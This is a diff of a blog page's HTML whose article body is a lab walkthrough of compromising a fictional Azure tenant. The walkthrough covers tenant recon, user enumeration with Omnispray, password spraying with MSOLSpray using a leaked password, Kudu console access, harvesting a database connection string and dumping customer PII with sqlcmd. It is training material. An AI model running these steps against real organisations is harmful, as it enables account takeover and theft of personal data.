@@ -10,7 +10,7 @@
 <meta name="description" content="Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment">
 <meta name="author" content="SecFortress">
 <link rel="canonical" href="http://localhost:1313/hacking/azure_recon_to_foothold_and_profit/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.89ca4972ab5e6aaa05e9a0dae0c4bb64b26585bc79e36f5cf33614eea0283abe.css" integrity="sha256-icpJcqteaqoF6aDa4MS7ZLJlhbx5429c8zYU7qAoOr4=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -31,7 +31,7 @@
   <meta property="og:site_name" content="SecFortress">
   <meta property="og:title" content="Azure Recon to Foothold and Profit">
   <meta property="og:description" content="Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment">
-  <meta property="og:locale" content="en-us">
+  <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="hacking">
     <meta property="article:published_time" content="2024-10-28T14:13:44+01:00">
@@ -40,9 +40,10 @@
     <meta property="article:tag" content="Red Teaming">
     <meta property="article:tag" content="Entra-ID">
     <meta property="article:tag" content="Powershell">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Azure Recon to Foothold and Profit">
-<meta name="twitter:description" content="Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Azure Recon to Foothold and Profit">
+  <meta name="twitter:description" content="Discover how various reconnaisance techniques could be used to enumerate Azure subscriptions and Tenant to identify mistakes or weak points when setting up an environment">
 
 
 <script type="application/ld+json">
@@ -75,7 +76,7 @@
   "keywords": [
     "Azure", "Red Teaming", "Entra-ID", "Powershell"
   ],
-  "articleBody": "Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nWalkThrough A possible password leak was found on pastebin\nWe need to determine if Mega Big Tech is using Azure Entra ID to manage their identities. The domain name megabigtech.com was given and it is possible check if a particular company is using Entra ID for authentication by browsing to the URL below. https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com\u0026xml=1\nWhereas replacing the ?login parameter with the domain name Then if the NameSpaceType value shows as Managed then the company is using Entra ID ; The GetUserRealm.srf path is known as a user realm discovery described by Microsoft An input is given on the Microsoft sign-in page for the username value A request is then sent to this endpoint to determine the type of account associated with that username We can then attempt to get more information about the tenant since we know the company is using Entra ID.\nThe following URL allows us to do this, by using the .well-known/openid-configuration endpoint in the context of OpenID Connect (OIDC), which is an identity layer on top of the OAuth 2.0 protocol.\nhttps://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration\nThis is a critical endpoint for -:\nClients to discover how to interact with the identity provider’s OAuth 2.0 Clients to discover how to interact with the identity provider’s OpenID Connect services As shown in the below screenshot the Tenant ID is revealed -:\nThere are also alternate ways to enumerate this for example, using tools like AADInternals\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Install-Module AADInternals PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Import-Module AADInternals ___ ___ ____ ____ __ __ / | / | / __ \\/ _/___ / /____ _________ ____ _/ /____ / /| | / /| | / / / // // __ \\/ __/ _ \\/ ___/ __ \\/ __ `/ / ___/ / ___ |/ ___ |/ /_/ _/ // / / / /_/ __/ / / / / / /_/ / (__ ) /_/ |_/_/ |_/_____/___/_/ /_/\\__/\\___/_/ /_/ /_/\\__,_/_/____/ v0.9.4 by @DrAzureAD (Nestori Syynimaa) With the below commands we can get the domain information and the Tenant ID\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AADIntLoginInformation -Domain megabigtech.com Federation Metadata Url : Cloud Instance : microsoftonline.com Account Type : Managed Federation Brand Name : Default Directory Tenant Banner Logo : State : 4 Pref Credential : 1 Cloud Instance audience urn : urn:federation:MicrosoftOnline Tenant Banner Illustration : Authentication Url : Domain Name : megabigtech.com Exists : 1 Federation Active Authentication Url : Domain Type : 3 Federation Protocol : Throttle Status : 0 Has Password : True Consumer Domain : Tenant Locale : Federation Global Version : User State : 1 Desktop Sso Enabled : PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AADIntTenantID -Domain megabigtech.com 2590ccef-687d-493b-ae8d-441cbab63a72 We can also run the next command, which looks to answer the following questions as described by PwnedLabs :\nValue Description DNS Does the DNS record exist? MX Does the MX point to Office 365? SPF Does the SPF contain Exchange Online? Type Federated or Managed DMARC Is the DMARC record configured? DKIM Is the DKIM record configured? MTA-STS Is the MTA-STS recored configured? STS The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server RPS Relaying parties of STS (AD FS). Requires -GetRelayingParties switch. Source: https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-AADIntReconAsOutsider -Domain \"megabigtech.com\" | Format-Table Tenant brand: Default Directory Tenant name: iancloudpwned.onmicrosoft.com Tenant id: 2590ccef-687d-493b-ae8d-441cbab63a72 Tenant region: EU DesktopSSO enabled: False Name DNS MX SPF DMARC DKIM MTA-STS Type STS ---- --- -- --- ----- ---- ------- ---- --- iancloudpwned.mail.onmicrosoft.com False False False False False Managed iancloudpwned.onmicrosoft.com False False False False False Managed international-am.com False False False False False Managed megabigtech.com False False False False False Managed We can also gather subdomains using the AzSubEnum tool, a specialized subdomain enumeration tool tailored for Azure services.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e git clone https://github.com/yuyudhn/AzSubEnum.git Cloning into 'AzSubEnum'... remote: Enumerating objects: 45, done. remote: Counting objects: 100% (45/45), done. remote: Compressing objects: 100% (38/38), done. remote: Total 45 (delta 20), reused 19 (delta 6), pack-reused 0 (from 0) Receiving objects: 100% (45/45), 386.80 KiB | 235.00 KiB/s, done. Resolving deltas: 100% (20/20), done. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e cd ./AzSubEnum/ PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/AzSubEnum\u003e python3 azsubenum.py -b megabigtech --thread 10 Discovered Subdomains: App Services - Management: --------------------------------------- megabigtech.scm.azurewebsites.net App Services: ----------------------------------- megabigtech.azurewebsites.net Navigating to the discovered App Services subdomain we have the below web page\nAccording to the above screenshots\nWe have some employees and their roles assigned We also have an email format ; “Kato.Sara@megabigtech.com” which could be used to create other emails also as shown below : yuki.tanaka@megabigtech.com yamamoto.sota@megabigtech.com takahashi.hina@megabigtech.com kato.sara@megabigtech.com Since we now have a username wordlist we can manually test them by going to https://login.microsoftonline.com. If a username is valid we would be prompted for a password else, a message “This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.” would be returned\nIt is possible to automate this whole process though by using a tool called Omnispray\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e git clone https://github.com/0xZDH/Omnispray Cloning into 'Omnispray'... remote: Enumerating objects: 460, done. remote: Counting objects: 100% (45/45), done. remote: Compressing objects: 100% (31/31), done. remote: Total 460 (delta 27), reused 19 (delta 14), pack-reused 415 (from 1) Receiving objects: 100% (460/460), 87.13 KiB | 97.00 KiB/s, done. Resolving deltas: 100% (302/302), done. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e cd ./Omnispray/ PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray\u003e nano users.txt PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray\u003e python3 omnispray.py --type enum -uf users.txt --module o365_enum_office *** Omnispray *** \u003e---------------------------------------\u003c \u003e version : 0.1.4 \u003e module : o365_enum_office \u003e type : enum \u003e userfile : users.txt \u003e count : 1 passwords/spray \u003e lockout : 15.0 minutes \u003e wait : 5.0 \u003e timeout : 25 seconds \u003e pause : 0.25 seconds \u003e rate : 10 threads \u003e start : 2024-10-26 15:15:52 \u003e---------------------------------------\u003c [2024-10-26 15:15:52,906] INFO : Generating prerequisite data via office.com... [2024-10-26 15:16:17,914] INFO : Enumerating 4 users via 'o365_enum_office' module [2024-10-26 15:16:30,667] INFO : [ + ] yuki.tanaka@megabigtech.com [ - ] yamamoto.sota@megabigtech.com [2024-10-26 15:16:32,797] INFO : Results can be found in: '/home/sec-fortress/Az_lab/Omnispray/results/' [2024-10-26 15:16:32,797] INFO : Valid user accounts: 1 [2024-10-26 15:16:33,049] INFO : /home/sec-fortress/Az_lab/Omnispray/omnispray.py executed in 40.26 seconds. Since we now have a valid set of account we can go ahead and perform a credential stuffing or password spraying attack as this are definitely noisy and risk detection (and locking accounts), and so it’s often worth exploring other avenues.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e wget https://raw.githubusercontent.com/dafthack/MSOLSpray/refs/heads/master/MSOLSpray.ps1 Saving to: ‘MSOLSpray.ps1’MSOLSpray.ps1 100%[=====================================================================================================\u003e] 8.52K 32.0KB/s in 0.3s 2024-10-26 15:25:51 (32.0 KB/s) - ‘MSOLSpray.ps1’ saved [8727/8727] ## Import module with dot sourcing PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e . .\\MSOLSpray.ps1 PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e echo \"yuki.tanaka@megabigtech.com\" \u003e valid_user PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-MSOLSpray -UserList ./valid_user -Password \"MegaDev79$\" -Verbose [*] There are 1 total users to spray. [*] Now spraying Microsoft Online. [*] Current date and time: 10/26/2024 15:27:00 VERBOSE: POST with 195-byte payload VERBOSE: received 3677-byte response of content type application/json [*] SUCCESS! yuki.tanaka@megabigtech.com : MegaDev79$ “Note: very often we wouldn’t be able to just log directly into a tenant over the Internet as MFA is getting more common place. Other guided labs from Pwned Labs where explored on how to check if MFA is enabled for gaps and to gain access.” – PwnedLabs\nWe can then attempt to gather as much information as possible with our credentialed access using the Az Powershell and Microsoft Graph PowerShell SDK modules\nConnect-AzAccount Connect-MgGraph To Enumerate all users in the tenant we can issue the following command.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzADUser Here are some few questions to ask after getting foothold with a compromised user as described by PwnedLabs:\nIs the user part of any group? If so, does this group has any role assigned to it? Does the user have any Azure Entra ID roles assigned to them? Which objects has this user created? Is this user the owner of any service principal? We can go ahead and query individual properties a using the Az PowerShell module which could help in mapping out possible responsibilities and relationships within the company.\nGet-AzADUser -UserPrincipalName 'yuki.tanaka@megabigtech.com' | fl Using the below command we could also check if there are resources owned by our current user (None Unfortunately) .\nGet-MgUserOwnedObject -UserId \"yuki.tanaka@megabigtech.com\" We could also check if our present user is a member of any groups by looping through all groups with the below script.\n$userId = \"yuki.tanaka@megabigtech.com\" $groupIds = (Get-MgUserMemberOf -UserId $userId).Id $groupNames = @() foreach ($groupId in $groupIds) { $group = Get-MgGroup -GroupId $groupId $groupNames += $group.DisplayName } $groupNames No interesting data or role where discovered in this tenant, We can switch to the Azure Subscription and enumerate which RBAC roles this user has.\nRetrieve the current authentication context for Azure Resource Manager requests PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzContext Tenant: Default Directory (2590ccef-687d-493b-ae8d-441cbab63a72) SubscriptionName SubscriptionId Account Environment ---------------- -------------- ------- ----------- Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 yuki.tanaka@megabigtech.com AzureCloud The Get-AzContext -ListAvailable cmdlet returns all available, previously logged in contexts\nIf a user hasn’t executed the Disconnect-AzAccount command The session’s context remains active! In which the Select-AzContext command could be used to impersonate the session. See Blog1, Blog2 and Blog3 to understand more. Enumerate subscriptions that are accessible/available to the current user PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzSubscription TenantId: 2590ccef-687d-493b-ae8d-441cbab63a72 Name Id State ---- -- ----- Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 Enabled Food For Thoughts :\nSo, many subscriptions can share one tenant, but each subscription is “loyal” to just one tenant.\nThe below command will return the resources for which the user has at least the Reader role in Role-Based Access Control (RBAC)\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzResource Name : megabigtechdevapp23 ResourceGroupName : mbt-rg-3 ResourceType : Microsoft.Web/sites Location : eastus ResourceId : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23 Tags : We can check what RBAC permissions we have over this Web App by running the following cmdlet\nGet-AzRoleAssignment -SignInName \u003cUser-Email\u003e Break Down :\nUser has the Website Contributor role on an Azure App Service. This role includes access to the Kudu console, a tool for debugging and monitoring Azure Web Apps. The Kudu console provides terminal access to the app’s underlying operating system in a low-privilege Linux sandbox. If the web app connects to other Azure resources (e.g., Azure SQL, Storage Account, Key Vault), the user may access these in the context of the app’s permissions. We can go ahead an enumerate the web app further using the following cmdlet\nGet-AzWebApp -Name megabigtechdevapp23 | select enabledhostnames We are more concerned about the megabigtachdevapp23.scm.azurewebsites.net output. Notice the scm between the app’s name and the default azure domain azurewebsites.net .\nSCM stands for Source Control Manager, otherwise known as Kudu.\nNavigating to this domain gives us this web page as shown below :\nNext, click on Debug console \u003e PowerShell .\nExploit Option 1 :\nWeb Apps often connect to backend resources using managed identities (a best practice). To verify this, check for environment variables like IDENTITY_ENDPOINT and IDENTITY_HEADER, which are required by managed identities. If these variables are present, you can request a token on behalf of the app to access its connected resources. For further details checkout this blog Exploit Option 2 :\nWeb Apps can also connect to resources using connection strings stored in environment variables (via App settings). You can list all environment variables with the env command. To find relevant variables, use grep to filter by keywords (e.g., connection string names or resource names). env | grep -i -e \"DB\" As shown in the above screenshot we got a connection string for an azure SQL instance at the well-known domain database.windows.net which provides us with the necessary credentials to connect to the database!\nIt is possible to enumerate useful software on this PowerShell session using the below cmdlet such as:\nMicrosoft SQL Server Command Line Utilities SQLCMD Microsoft SQL Server (along with any mention of “Tools” or “Utilities”) ODBC Driver for SQL Server (sometimes sqlcmd is installed alongside ODBC drivers) Get-ItemProperty -Path \"HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\", \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\", \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" |where { $_.DisplayName -ne $null } | Select-Object DisplayName, DisplayVersion, InstallDate We can therefore query the database and check for available tables.\nsqlcmd -S megabigdevsqlserver.database.windows.net -U \u003cUsername\u003e -P \u003c'Password'\u003e -d \u003cDB-NAME\u003e -Q \"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'\" The CustomerData table was returned in output. Retrieving data from this table reveals PII (personally identifiable information) of Mega Big Tech customers :(\nsqlcmd -S megabigdevsqlserver.database.windows.net -U \u003cUsername\u003e -P \u003c'Password'\u003e -d \u003cDB-NAME\u003e -Q \"SELECT * FROM CustomerData\" That’s all for today. For further reading, I recommend checking out PwnedLabs, which includes defensive strategies to mitigate these issues ⛇☃︎.\n",
+  "articleBody": "Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nWalkThrough A possible password leak was found on pastebin\nWe need to determine if Mega Big Tech is using Azure Entra ID to manage their identities. The domain name megabigtech.com was given and it is possible check if a particular company is using Entra ID for authentication by browsing to the URL below. https://login.microsoftonline.com/getuserrealm.srf?login=megabigtech.com\u0026xml=1\nWhereas replacing the ?login parameter with the domain name Then if the NameSpaceType value shows as Managed then the company is using Entra ID ; The GetUserRealm.srf path is known as a user realm discovery described by Microsoft An input is given on the Microsoft sign-in page for the username value A request is then sent to this endpoint to determine the type of account associated with that username We can then attempt to get more information about the tenant since we know the company is using Entra ID.\nThe following URL allows us to do this, by using the .well-known/openid-configuration endpoint in the context of OpenID Connect (OIDC), which is an identity layer on top of the OAuth 2.0 protocol.\nhttps://login.microsoftonline.com/megabigtech.com/.well-known/openid-configuration\nThis is a critical endpoint for -:\nClients to discover how to interact with the identity provider’s OAuth 2.0 Clients to discover how to interact with the identity provider’s OpenID Connect services As shown in the below screenshot the Tenant ID is revealed -:\nThere are also alternate ways to enumerate this for example, using tools like AADInternals\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Install-Module AADInternals PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Import-Module AADInternals ___ ___ ____ ____ __ __ / | / | / __ \\/ _/___ / /____ _________ ____ _/ /____ / /| | / /| | / / / // // __ \\/ __/ _ \\/ ___/ __ \\/ __ `/ / ___/ / ___ |/ ___ |/ /_/ _/ // / / / /_/ __/ / / / / / /_/ / (__ ) /_/ |_/_/ |_/_____/___/_/ /_/\\__/\\___/_/ /_/ /_/\\__,_/_/____/ v0.9.4 by @DrAzureAD (Nestori Syynimaa) With the below commands we can get the domain information and the Tenant ID\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AADIntLoginInformation -Domain megabigtech.com Federation Metadata Url : Cloud Instance : microsoftonline.com Account Type : Managed Federation Brand Name : Default Directory Tenant Banner Logo : State : 4 Pref Credential : 1 Cloud Instance audience urn : urn:federation:MicrosoftOnline Tenant Banner Illustration : Authentication Url : Domain Name : megabigtech.com Exists : 1 Federation Active Authentication Url : Domain Type : 3 Federation Protocol : Throttle Status : 0 Has Password : True Consumer Domain : Tenant Locale : Federation Global Version : User State : 1 Desktop Sso Enabled : PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AADIntTenantID -Domain megabigtech.com 2590ccef-687d-493b-ae8d-441cbab63a72 We can also run the next command, which looks to answer the following questions as described by PwnedLabs :\nValue Description DNS Does the DNS record exist? MX Does the MX point to Office 365? SPF Does the SPF contain Exchange Online? Type Federated or Managed DMARC Is the DMARC record configured? DKIM Is the DKIM record configured? MTA-STS Is the MTA-STS recored configured? STS The FQDN of the federated IdP’s (Identity Provider) STS (Security Token Service) server RPS Relaying parties of STS (AD FS). Requires -GetRelayingParties switch. Source: https://aadinternals.com/aadinternals/#invoke-aadintreconasoutsider\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-AADIntReconAsOutsider -Domain \"megabigtech.com\" | Format-Table Tenant brand: Default Directory Tenant name: iancloudpwned.onmicrosoft.com Tenant id: 2590ccef-687d-493b-ae8d-441cbab63a72 Tenant region: EU DesktopSSO enabled: False Name DNS MX SPF DMARC DKIM MTA-STS Type STS ---- --- -- --- ----- ---- ------- ---- --- iancloudpwned.mail.onmicrosoft.com False False False False False Managed iancloudpwned.onmicrosoft.com False False False False False Managed international-am.com False False False False False Managed megabigtech.com False False False False False Managed We can also gather subdomains using the AzSubEnum tool, a specialized subdomain enumeration tool tailored for Azure services.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e git clone https://github.com/yuyudhn/AzSubEnum.git Cloning into 'AzSubEnum'... remote: Enumerating objects: 45, done. remote: Counting objects: 100% (45/45), done. remote: Compressing objects: 100% (38/38), done. remote: Total 45 (delta 20), reused 19 (delta 6), pack-reused 0 (from 0) Receiving objects: 100% (45/45), 386.80 KiB | 235.00 KiB/s, done. Resolving deltas: 100% (20/20), done. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e cd ./AzSubEnum/ PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/AzSubEnum\u003e python3 azsubenum.py -b megabigtech --thread 10 Discovered Subdomains: App Services - Management: --------------------------------------- megabigtech.scm.azurewebsites.net App Services: ----------------------------------- megabigtech.azurewebsites.net Navigating to the discovered App Services subdomain we have the below web page\nAccording to the above screenshots\nWe have some employees and their roles assigned We also have an email format ; “Kato.Sara@megabigtech.com” which could be used to create other emails also as shown below : yuki.tanaka@megabigtech.com\ryamamoto.sota@megabigtech.com\rtakahashi.hina@megabigtech.com\rkato.sara@megabigtech.com Since we now have a username wordlist we can manually test them by going to https://login.microsoftonline.com. If a username is valid we would be prompted for a password else, a message “This username may be incorrect. Make sure you typed it correctly. Otherwise, contact your admin.” would be returned\nIt is possible to automate this whole process though by using a tool called Omnispray\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e git clone https://github.com/0xZDH/Omnispray Cloning into 'Omnispray'... remote: Enumerating objects: 460, done. remote: Counting objects: 100% (45/45), done. remote: Compressing objects: 100% (31/31), done. remote: Total 460 (delta 27), reused 19 (delta 14), pack-reused 415 (from 1) Receiving objects: 100% (460/460), 87.13 KiB | 97.00 KiB/s, done. Resolving deltas: 100% (302/302), done. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e cd ./Omnispray/ PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray\u003e nano users.txt PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab/Omnispray\u003e python3 omnispray.py --type enum -uf users.txt --module o365_enum_office *** Omnispray *** \u003e---------------------------------------\u003c \u003e version : 0.1.4 \u003e module : o365_enum_office \u003e type : enum \u003e userfile : users.txt \u003e count : 1 passwords/spray \u003e lockout : 15.0 minutes \u003e wait : 5.0 \u003e timeout : 25 seconds \u003e pause : 0.25 seconds \u003e rate : 10 threads \u003e start : 2024-10-26 15:15:52 \u003e---------------------------------------\u003c [2024-10-26 15:15:52,906] INFO : Generating prerequisite data via office.com... [2024-10-26 15:16:17,914] INFO : Enumerating 4 users via 'o365_enum_office' module [2024-10-26 15:16:30,667] INFO : [ + ] yuki.tanaka@megabigtech.com [ - ] yamamoto.sota@megabigtech.com [2024-10-26 15:16:32,797] INFO : Results can be found in: '/home/sec-fortress/Az_lab/Omnispray/results/' [2024-10-26 15:16:32,797] INFO : Valid user accounts: 1 [2024-10-26 15:16:33,049] INFO : /home/sec-fortress/Az_lab/Omnispray/omnispray.py executed in 40.26 seconds. Since we now have a valid set of account we can go ahead and perform a credential stuffing or password spraying attack as this are definitely noisy and risk detection (and locking accounts), and so it’s often worth exploring other avenues.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e wget https://raw.githubusercontent.com/dafthack/MSOLSpray/refs/heads/master/MSOLSpray.ps1 Saving to: ‘MSOLSpray.ps1’MSOLSpray.ps1 100%[=====================================================================================================\u003e] 8.52K 32.0KB/s in 0.3s 2024-10-26 15:25:51 (32.0 KB/s) - ‘MSOLSpray.ps1’ saved [8727/8727] ## Import module with dot sourcing PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e . .\\MSOLSpray.ps1 PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e echo \"yuki.tanaka@megabigtech.com\" \u003e valid_user PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Invoke-MSOLSpray -UserList ./valid_user -Password \"MegaDev79$\" -Verbose [*] There are 1 total users to spray. [*] Now spraying Microsoft Online. [*] Current date and time: 10/26/2024 15:27:00 VERBOSE: POST with 195-byte payload VERBOSE: received 3677-byte response of content type application/json [*] SUCCESS! yuki.tanaka@megabigtech.com : MegaDev79$ “Note: very often we wouldn’t be able to just log directly into a tenant over the Internet as MFA is getting more common place. Other guided labs from Pwned Labs where explored on how to check if MFA is enabled for gaps and to gain access.” – PwnedLabs\nWe can then attempt to gather as much information as possible with our credentialed access using the Az Powershell and Microsoft Graph PowerShell SDK modules\nConnect-AzAccount\rConnect-MgGraph To Enumerate all users in the tenant we can issue the following command.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzADUser Here are some few questions to ask after getting foothold with a compromised user as described by PwnedLabs:\nIs the user part of any group? If so, does this group has any role assigned to it? Does the user have any Azure Entra ID roles assigned to them? Which objects has this user created? Is this user the owner of any service principal? We can go ahead and query individual properties a using the Az PowerShell module which could help in mapping out possible responsibilities and relationships within the company.\nGet-AzADUser -UserPrincipalName 'yuki.tanaka@megabigtech.com' | fl Using the below command we could also check if there are resources owned by our current user (None Unfortunately) .\nGet-MgUserOwnedObject -UserId \"yuki.tanaka@megabigtech.com\" We could also check if our present user is a member of any groups by looping through all groups with the below script.\n$userId = \"yuki.tanaka@megabigtech.com\" $groupIds = (Get-MgUserMemberOf -UserId $userId).Id $groupNames = @() foreach ($groupId in $groupIds) { $group = Get-MgGroup -GroupId $groupId $groupNames += $group.DisplayName } $groupNames No interesting data or role where discovered in this tenant, We can switch to the Azure Subscription and enumerate which RBAC roles this user has.\nRetrieve the current authentication context for Azure Resource Manager requests PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzContext Tenant: Default Directory (2590ccef-687d-493b-ae8d-441cbab63a72) SubscriptionName SubscriptionId Account Environment ---------------- -------------- ------- ----------- Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 yuki.tanaka@megabigtech.com AzureCloud The Get-AzContext -ListAvailable cmdlet returns all available, previously logged in contexts\nIf a user hasn’t executed the Disconnect-AzAccount command The session’s context remains active! In which the Select-AzContext command could be used to impersonate the session. See Blog1, Blog2 and Blog3 to understand more. Enumerate subscriptions that are accessible/available to the current user PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzSubscription TenantId: 2590ccef-687d-493b-ae8d-441cbab63a72 Name Id State ---- -- ----- Microsoft Azure Sponsorship ceff06cb-e29d-4486-a3ae-eaaec5689f94 Enabled Food For Thoughts :\nSo, many subscriptions can share one tenant, but each subscription is “loyal” to just one tenant.\nThe below command will return the resources for which the user has at least the Reader role in Role-Based Access Control (RBAC)\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzResource Name : megabigtechdevapp23 ResourceGroupName : mbt-rg-3 ResourceType : Microsoft.Web/sites Location : eastus ResourceId : /subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94/resourceGroups/mbt-rg-3/providers/Microsoft.Web/sites/megabigtechdevapp23 Tags : We can check what RBAC permissions we have over this Web App by running the following cmdlet\nGet-AzRoleAssignment -SignInName \u003cUser-Email\u003e Break Down :\nUser has the Website Contributor role on an Azure App Service. This role includes access to the Kudu console, a tool for debugging and monitoring Azure Web Apps. The Kudu console provides terminal access to the app’s underlying operating system in a low-privilege Linux sandbox. If the web app connects to other Azure resources (e.g., Azure SQL, Storage Account, Key Vault), the user may access these in the context of the app’s permissions. We can go ahead an enumerate the web app further using the following cmdlet\nGet-AzWebApp -Name megabigtechdevapp23 | select enabledhostnames We are more concerned about the megabigtachdevapp23.scm.azurewebsites.net output. Notice the scm between the app’s name and the default azure domain azurewebsites.net .\nSCM stands for Source Control Manager, otherwise known as Kudu.\nNavigating to this domain gives us this web page as shown below :\nNext, click on Debug console \u003e PowerShell .\nExploit Option 1 :\nWeb Apps often connect to backend resources using managed identities (a best practice). To verify this, check for environment variables like IDENTITY_ENDPOINT and IDENTITY_HEADER, which are required by managed identities. If these variables are present, you can request a token on behalf of the app to access its connected resources. For further details checkout this blog Exploit Option 2 :\nWeb Apps can also connect to resources using connection strings stored in environment variables (via App settings). You can list all environment variables with the env command. To find relevant variables, use grep to filter by keywords (e.g., connection string names or resource names). env | grep -i -e \"DB\" As shown in the above screenshot we got a connection string for an azure SQL instance at the well-known domain database.windows.net which provides us with the necessary credentials to connect to the database!\nIt is possible to enumerate useful software on this PowerShell session using the below cmdlet such as:\nMicrosoft SQL Server Command Line Utilities SQLCMD Microsoft SQL Server (along with any mention of “Tools” or “Utilities”) ODBC Driver for SQL Server (sometimes sqlcmd is installed alongside ODBC drivers) Get-ItemProperty -Path \"HKLM:\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\", \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\", \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" |where { $_.DisplayName -ne $null } | Select-Object DisplayName, DisplayVersion, InstallDate We can therefore query the database and check for available tables.\nsqlcmd -S megabigdevsqlserver.database.windows.net -U \u003cUsername\u003e -P \u003c'Password'\u003e -d \u003cDB-NAME\u003e -Q \"SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'\" The CustomerData table was returned in output. Retrieving data from this table reveals PII (personally identifiable information) of Mega Big Tech customers :(\nsqlcmd -S megabigdevsqlserver.database.windows.net -U \u003cUsername\u003e -P \u003c'Password'\u003e -d \u003cDB-NAME\u003e -Q \"SELECT * FROM CustomerData\" That’s all for today. For further reading, I recommend checking out PwnedLabs, which includes defensive strategies to mitigate these issues ⛇☃︎.\n",
   "wordCount" : "2064",
